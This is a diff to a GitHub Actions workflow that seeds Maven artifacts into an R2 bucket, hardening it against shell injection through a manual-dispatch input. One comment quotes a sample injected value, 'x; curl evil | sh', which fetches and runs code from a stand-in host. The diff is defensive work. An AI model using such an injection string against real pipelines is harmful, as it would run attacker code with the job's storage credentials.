@@ -37,10 +37,39 @@ jobs:
     steps:
       - uses: actions/checkout@v6
 
+      - name: Validate the coordinate override
+        env:
+          # Read as DATA, from the environment. Never `${{ inputs.coordinates }}`
+          # inside a run: block -- GitHub substitutes that into the shell program text
+          # before bash parses it, so a dispatcher supplying `x; curl evil | sh` would
+          # execute it as this job, which holds R2 write credentials. Variable
+          # expansion, by contrast, word-splits but is never re-parsed for operators.
+          COORDINATES: ${{ inputs.coordinates }}
+        run: |
+          # set -f: without it the unquoted expansion below would also glob, so a
+          # coordinate containing * would silently become a list of filenames.
+          set -f
+          for coordinate in $COORDINATES; do
+            case "$coordinate" in
+              *[!A-Za-z0-9.:,_-]*)
+                echo "Refusing coordinate '$coordinate'." >&2
+                echo "Only [A-Za-z0-9.:,_-] are allowed; the form is" >&2
+                echo "<artifactId>:<version>[:<classifier>,...]." >&2
+                exit 1
+                ;;
+            esac
+          done
+          echo "Coordinate override: ${COORDINATES:-<none, using the derived set>}"
+
       - name: Seed
-        # Unquoted expansion is deliberate: the input is a space-separated coordinate
-        # list, and blank must expand to no arguments so the script uses its own set.
-        run: bash maven/scripts/r2/seed-frozen-artifacts.sh ${{ inputs.coordinates }}
+        env:
+          COORDINATES: ${{ inputs.coordinates }}
+        run: |
+          set -f
+          # Unquoted on purpose: the input is a space-separated coordinate list, and
+          # blank must expand to no arguments so the script uses its own derived set.
+          # Validated above.
+          bash maven/scripts/r2/seed-frozen-artifacts.sh $COORDINATES
 
       - name: Regenerate R2 metadata
         # Seeded artifacts are resolved by exact pinned version rather than discovered,
@@ -50,7 +79,11 @@ jobs:
         run: python3 maven/scripts/r2/regen-maven-metadata.py
 
       - name: Verify
+        env:
+          COORDINATES: ${{ inputs.coordinates }}
         # The same gate the release runs, so a green seed here means the next tag
         # cannot fail on this. Reads the public URL, not the bucket, so it also proves
         # the custom domain is serving what was uploaded.
-        run: bash maven/scripts/r2/check-frozen-artifacts.sh ${{ inputs.coordinates }}
+        run: |
+          set -f
+          bash maven/scripts/r2/check-frozen-artifacts.sh $COORDINATES
